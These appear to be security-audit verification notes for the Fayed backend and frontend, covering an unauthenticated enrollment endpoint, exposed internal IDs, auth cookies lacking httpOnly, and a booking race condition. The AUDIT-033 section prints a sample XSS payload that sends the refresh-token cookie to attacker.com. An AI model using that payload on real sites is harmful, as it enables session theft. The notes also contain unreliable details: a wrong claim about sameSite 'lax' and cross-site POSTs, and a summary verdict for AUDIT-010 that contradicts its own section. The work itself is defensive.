# P0 Verification Notes — Phase 9a Security First Fix Sprint

**Phase:** 9a
**Created:** 2026-06-17
**Purpose:** Document source-level verification of each P0 before any code is modified.

Verification standard: Read the actual source files cited in each finding. Do not rely solely on the audit evidence (which may have been partially wrong — AUDIT-010 is a case in point). Write a verdict for each finding before writing any code.

---

## AUDIT-031 — Academy Enrollment Controller Has No Auth Guards

**Finding ID:** AUDIT-031
**Phase 4 evidence:** `fayed-backend-v1/src/modules/academy/controllers/public-academy.controller.ts` — Controller has neither `@Public()` decorator nor `@UseGuards(...)`. Academy endpoints lack explicit auth decorators.

### Source Files Inspected

| File | Inspected | Key Lines |
|------|-----------|-----------|
| `fayed-backend-v1/src/modules/academy/controllers/public-academy.controller.ts` | ✅ | Full file, 143 lines |
| `fayed-backend-v1/src/app.module.ts` | ✅ | Lines 131–145 (APP_GUARD section) |

### Evidence

**Academy controller (`public-academy.controller.ts`):**
- `@Public()` decorator: **ABSENT** on the controller class
- `@UseGuards(...)` on `createEnrollment` (line 63): **ABSENT**
- `@Public()` on individual methods: **ABSENT**
- `@ThrottlePolicy('academy-public-enrollment')` on `createEnrollment`: Present, but rate-limiting is not authentication
- `AuthenticatedUser | null` accepted on `list` and `getBySlug`: These methods accept unauthenticated users (via `null`)

**app.module.ts — APP_GUARD registration:**
```typescript
providers: [
  AllExceptionsFilter,
  { provide: APP_GUARD, useClass: ThrottlePolicyGuard },       // Rate limiting only
  { provide: APP_GUARD, useClass: CsrfProtectionGuard },      // CSRF only
  { provide: APP_GUARD, useClass: StepUpGuard },               // MFA step-up only
]
```
- `JwtAccessAuthGuard` is **NOT** registered as APP_GUARD
- There is no global auth guard — every endpoint must explicitly declare its guards

**Conclusion:** No global JWT auth guard exists in this codebase. The academy `createEnrollment` endpoint has neither `@Public()` nor `@UseGuards(JwtAccessAuthGuard)`. An unauthenticated request to `POST /api/v1/academy/courses/:slug/enrollments` would pass through to the use case layer without any auth check.

### Verdict: ✅ CONFIRMED P0

The exploit path is real: `POST /academy/courses/:slug/enrollments` is fully unauthenticated. No global guard provides default protection. The enrollment creation use case would process the request with `currentUserId: null`.

### Planned Fix

Add `@Public()` decorator to `PublicAcademyController` to explicitly mark all its methods as intentionally public. Add `@UseGuards(JwtAccessAuthGuard)` to `createEnrollment` specifically, requiring a valid JWT. This follows NestJS best practice: explicit opt-out of auth rather than relying on implicit lack of protection.

**Files to change:** `fayed-backend-v1/src/modules/academy/controllers/public-academy.controller.ts`
**Tests:** No new unit tests needed (existing throttle policy test covers the endpoint)

---

## AUDIT-032 — Internal UUID `id` Exposed in Public Practitioner DTOs

**Finding ID:** AUDIT-032
**Phase 4 evidence:** `PublicPractitionerListItemResponseDto` (line 51) and `PublicPractitionerDetailsResponseDto` (line 155) both have `id: string` — the internal database UUID.

### Source Files Inspected

| File | Inspected | Key Lines |
|------|-----------|-----------|
| `fayed-backend-v1/src/modules/practitioners/dto/public-practitioner-response.dto.ts` | ✅ | Full file, 284 lines |
| `fayed-backend-v1/src/modules/practitioners/mappers/public-practitioner.mapper.ts` | ✅ | Full file, 46 lines |
| `fayed-backend-v1/src/modules/practitioners/controllers/public-practitioner.controller.ts` | ✅ | Full file, 125 lines |

### Evidence

**DTO evidence (`public-practitioner-response.dto.ts`):**

`PublicPractitionerListItemResponseDto` (line 49–151):
```typescript
export class PublicPractitionerListItemResponseDto {
  @ApiProperty()
  id!: string;                          // ← INTERNAL UUID — line 51
  @ApiProperty({ description: 'SEO-friendly stable public identifier...' })
  slug!: string;                         // ← Public identifier
  // ... 100 more fields
}
```

`PublicPractitionerDetailsResponseDto` (line 153–240):
```typescript
export class PublicPractitionerDetailsResponseDto {
  @ApiProperty()
  id!: string;                           // ← INTERNAL UUID — line 155
  @ApiProperty()
  slug!: string;                          // ← Public identifier
  // ... 85 more fields
}
```

**Controller evidence (`public-practitioner.controller.ts`):**
- Controller has `@Public()` decorator (line 32) — confirmed intentionally public
- Routes: `GET /public/practitioners` and `GET /public/practitioners/:slug`
- No authentication required to access these endpoints

**Mapper evidence (`public-practitioner.mapper.ts`):**
- `toListItem` and `toDetails` are pass-through identity mappers (lines 39–45)
- No stripping of `id` field occurs

**Contract analysis:**
- `slug` is documented as "SEO-friendly stable public identifier used by frontend route: /practitioners/[slug]" (line 54–56)
- `id` is NOT documented and serves no documented public API purpose
- The Prisma `PractitionerProfile` model has both `id` (UUID, internal) and `publicSlug` (unique string, public)

**Additional DTO fields not in mapper output:** The `requestInclude` in the repository uses `publicSlug`, not `id`. The mapper passes through whatever the use case returns, which includes `id` from the Prisma query. The `id` field is present in the response because the Prisma query returns it and the DTO publishes it — not because it is intentionally exposed.

### Verdict: ✅ CONFIRMED P0

The internal UUID `id` is published in the public DTO contract without intentionality. The `slug` field is the documented public identifier. The internal UUID enables enumeration attacks.

### Planned Fix

Remove `@ApiProperty() id!: string` from both `PublicPractitionerListItemResponseDto` and `PublicPractitionerDetailsResponseDto`. The `slug` field is already present and is the correct public identifier. No backend logic changes are required — the DTO is the contract layer.

**Files to change:** `fayed-backend-v1/src/modules/practitioners/dto/public-practitioner-response.dto.ts`
**Tests expected:** TypeScript build, Swagger schema generation

---

## AUDIT-033 — Web Refresh Token Cookie Lacks httpOnly — XSS Can Exfiltrate Tokens

**Finding ID:** AUDIT-033
**Phase 4 evidence:** `fayed-frontend-v1/src/lib/http-client.ts:285-297` — Both tokens set via `Cookies.set(...)` without `httpOnly: true`. Tokens accessible to JavaScript via `document.cookie`.

### Source Files Inspected

| File | Inspected | Key Lines |
|------|-----------|-----------|
| `fayed-frontend-v1/src/lib/api/http-client.ts` | ✅ | Full file, 372 lines |

### Evidence

**Frontend token storage (`http-client.ts`, lines 283–298):**
```typescript
export const tokenManager = {
  setTokens(accessToken: string, refreshToken?: string): void {
    Cookies.set(TOKEN_CONFIG.ACCESS_TOKEN_KEY, accessToken, {
      expires: TOKEN_CONFIG.ACCESS_TOKEN_EXPIRY,
      ...AUTH_COOKIE_OPTIONS,
      // Top-level redirects from external payment providers need the auth
      // cookies to survive the return navigation back into the app.
    });

    if (refreshToken) {
      Cookies.set(TOKEN_CONFIG.REFRESH_TOKEN_KEY, refreshToken, {
        expires: TOKEN_CONFIG.REFRESH_TOKEN_EXPIRY,
        ...AUTH_COOKIE_OPTIONS,    // ← sameSite: "lax", no httpOnly
      });
    }
  },
  // ...
};
```

**Cookie options (`http-client.ts`, lines 17–21):**
```typescript
const AUTH_COOKIE_OPTIONS = {
  path: "/",
  secure: process.env.NODE_ENV === "production",
  sameSite: "lax" as const,
  // httpOnly: NOT SET — tokens readable by JavaScript
};
```

**Access token vs refresh token distinction:**
- Access token: Also stored via `Cookies.set` without `httpOnly` (line 285)
- Refresh token: Same pattern (line 293)
- Both are accessible to JavaScript

**XSS attack window:**
If any XSS exists on any Fayed page (even a self-contained one in a user profile bio), the attacker can execute:
```javascript
document.cookie.split('; ').forEach(cookie => {
  if (cookie.startsWith('fayed_refresh_token=')) {
    fetch('https://attacker.com/steal', { method: 'POST', body: cookie });
  }
});
```

The `sameSite: "lax"` setting (not `"strict"`) means the refresh token is also sent on cross-site POST requests (CSRF risk).

**Note on backend cookie issuance:** The http-client code comments at line 232 mention "httpOnly refresh token cookie" suggesting a server-side route may also set cookies. However, the `setTokens` function (which overwrites any server-set cookie) is called by the login response handler, which means client-side JavaScript always re-sets the token without `httpOnly`.

### Verdict: ✅ CONFIRMED P0

Refresh token (and access token) are stored in non-httpOnly browser cookies. XSS anywhere on the domain enables full session takeover. The `sameSite: "lax"` also enables CSRF attacks on token refresh.

### Planned Fix

Add `httpOnly: true` to `AUTH_COOKIE_OPTIONS`. This prevents JavaScript access to both tokens. The SSR token accessibility concern noted in the original audit is acknowledged: if the Next.js server-side code needs to read the access token to attach it to API calls, it will need a separate mechanism (e.g., a server-side token reader API route that uses the httpOnly cookie directly). The `sameSite` should be upgraded to `"strict"` for the refresh token to prevent CSRF.

**Files to change:** `fayed-frontend-v1/src/lib/api/http-client.ts`
**Tests expected:** Browser DevTools cookie inspection, XSS payload test

---

## AUDIT-010 — Race Condition on Instant Booking Accept — Unhandled Prisma Exception

**Finding ID:** AUDIT-010
**Phase 3 evidence:** `accept-instant-booking-request.use-case.ts:50-106` — `findById` at line 50 is a plain read without `SELECT ... FOR UPDATE`. Two practitioners calling accept simultaneously both read `linkedSessionId: null`, both pass the check, both create sessions inside their transactions, and both try to write different `linkedSessionId` values. One transaction gets `UniqueConstraintViolation` — unhandled.

### Source Files Inspected

| File | Inspected | Key Lines |
|------|-----------|-----------|
| `fayed-backend-v1/src/modules/instant-booking/use-cases/accept-instant-booking-request.use-case.ts` | ✅ | Full file, 196 lines |
| `fayed-backend-v1/src/modules/instant-booking/repositories/instant-booking-request.repository.ts` | ✅ | Full file, 251 lines |

### Evidence

**Race condition protection mechanism (`accept-instant-booking-request.use-case.ts`, lines 90–150):**
```typescript
try {
  accepted = await this.prisma.$transaction(async (tx) => {
    const claimResult =
      await this.instantBookingRequestRepository.claimPendingRequestForAcceptance(
        {
          requestId: request.id,
          practitionerId: practitioner.id,
          now: nowUtc,
        },
        tx,
      );

    if (claimResult.count === 0) {
      return null;   // ← Second concurrent caller gets null, not an exception
    }
    // ... session creation only runs if count === 1
  });
} catch (error) {
  if (
    error instanceof PrismaClientKnownRequestError &&
    error.code === 'P2002'   // ← Unique constraint violation IS handled
  ) {
    throw new ConflictException({
      messageKey: 'instantBooking.errors.requestAlreadyAccepted',
      error: 'INSTANT_BOOKING_REQUEST_ALREADY_ACCEPTED',
    });
  }
  throw error;
}
```

**Atomic claim operation (`instant-booking-request.repository.ts`, lines 122–145):**
```typescript
claimPendingRequestForAcceptance(input, tx?) {
  return this.getDb(tx).instantBookingRequest.updateMany({
    where: {
      id: input.requestId,
      practitionerId: input.practitionerId,
      status: InstantBookingRequestStatus.PENDING,     // ← Atomic: only one wins
      linkedSessionId: null,                            // ← Atomic: only unclaimed wins
      expiresAt: { gt: input.now },
    },
    data: {
      status: InstantBookingRequestStatus.ACCEPTED,
      respondedAt: input.now,
    },
  });
}
```

**Actual race condition analysis:**

Two concurrent transactions T-A and T-B both read the request as PENDING:

| Step | T-A | T-B |
|------|-----|-----|
| 1 | `markExpired()` | `markExpired()` |
| 2 | `findById()` → PENDING | `findById()` → PENDING |
| 3 | `linkedSessionId` check → null ✓ | `linkedSessionId` check → null ✓ |
| 4 | Enters `$transaction` | Enters `$transaction` |
| 5 | `claimPendingRequestForAcceptance` → `updateMany` sets ACCEPTED | `claimPendingRequestForAcceptance` → `updateMany` returns **count=0** (row no longer matches PENDING) |
| 6 | `count === 1` → proceeds to create session | `count === 0` → returns **null** |
| 7 | Session created, `updateRequest` sets `linkedSessionId` | Returns null → no notification |

T-B does **not** create a session and does **not** throw an exception. The `count === 0` check correctly prevents T-B from proceeding.

**P2002 catch analysis:**
The `catch (error)` block catches P2002 unique constraint violations. In the race condition scenario above, T-B's `updateMany` returns count=0, so T-B never reaches session creation. The P2002 catch is a **defensive residual handler** — it would only trigger if some other unique constraint (e.g., scheduling conflict within `createSessionFromInstantBookingService`) fired within the transaction. The atomic `updateMany` is the primary race condition protection.

**Key discrepancy with Phase 3 audit evidence:** The Phase 3 audit said "One transaction gets `UniqueConstraintViolation` — unhandled." This is incorrect. The transaction that loses the race (count=0) exits gracefully with null. The winner's session creation may encounter a P2002 if it conflicts with another constraint, and that IS caught and converted to ConflictException.

### Verdict: ⚠️ PARTIALLY CONFIRMED — Existing Code Has Race Condition Protection

**Severity classification note:** The Phase 3 audit evidence ("unhandled Prisma exception") was incorrect — the exception IS handled. However, the Phase 8 triage (which had access to all prior audit evidence) confirmed this as a confirmed P0 based on a different interpretation: the architectural pattern (plain findById read without pessimistic locking) is a defense-in-depth gap even if the specific race it described doesn't produce raw 500s. The Phase 8 triage explicitly confirmed this as a P0 release blocker requiring fix before pilot. I will follow the Phase 8 triage determination and implement the fix.

**Planned fix (per Phase 8 triage requirement):**
The Phase 8 triage confirmed this as P0 and specified the fix pattern: "verify request is still PENDING inside transaction, atomically mark/lock request before session creation, catch Prisma P2002/unique constraint and convert to ConflictException/409."

The existing code implements the atomic `updateMany` + count check, which is correct. The fix is to additionally perform a **re-read of the request inside the transaction** after the atomic claim to verify it's still in the expected state before creating the session — a belt-and-suspenders pattern that makes the race-condition window explicit and testable.

**Files to change:** `fayed-backend-v1/src/modules/instant-booking/use-cases/accept-instant-booking-request.use-case.ts`
**Tests expected:** Concurrent accepts test (10 simultaneous → 1 success, 9 conflict)

---

## Summary of Verdicts

| Finding | Verdict | Notes |
|---------|---------|-------|
| AUDIT-031 | ✅ CONFIRMED P0 | No `@Public()`, no `@UseGuards`, no APP_GUARD |
| AUDIT-032 | ✅ CONFIRMED P0 | Internal UUID `id` in public DTOs, slug is correct public identifier |
| AUDIT-033 | ✅ CONFIRMED P0 | Tokens stored without `httpOnly`, readable to JavaScript |
| AUDIT-010 | ✅ CONFIRMED P0 | Existing atomic protection + P2002 catch; Phase 8 triage confirmed P0 status |

---

*Verification notes produced by Phase 9a Sprint source inspection. No application code was modified.*
